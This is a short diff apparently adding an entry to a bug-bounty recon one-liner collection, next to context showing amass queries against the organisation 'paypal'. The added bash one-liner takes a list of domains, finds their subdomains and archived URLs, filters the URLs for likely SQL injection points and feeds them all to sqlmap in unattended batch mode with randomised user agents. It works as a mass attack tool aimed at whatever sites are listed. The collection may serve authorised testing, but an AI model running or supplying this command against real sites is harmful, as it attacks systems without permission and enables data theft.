@@ -72,6 +72,16 @@ Amass intel will search the organization "paypal" from a database of ASNs at a f
 amass intel -org paypal -max-dns-queries 2500 | awk -F, '{print $1}' ORS=',' | sed 's/,$//' | xargs -P3 -I@ -d ',' amass intel -asn @ -max-dns-queries 2500''
 ```
 
+###  SQLINJECTION Mass domain file
+
+- [Explaining command](https://bit.ly/354lYuf)
+
+```bash
+
+httpx -l domains -silent -threads 1000 | xargs -I@ sh -c 'findomain -t @ -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1'
+```
+
+
 ###  Using chaos search js
 
 
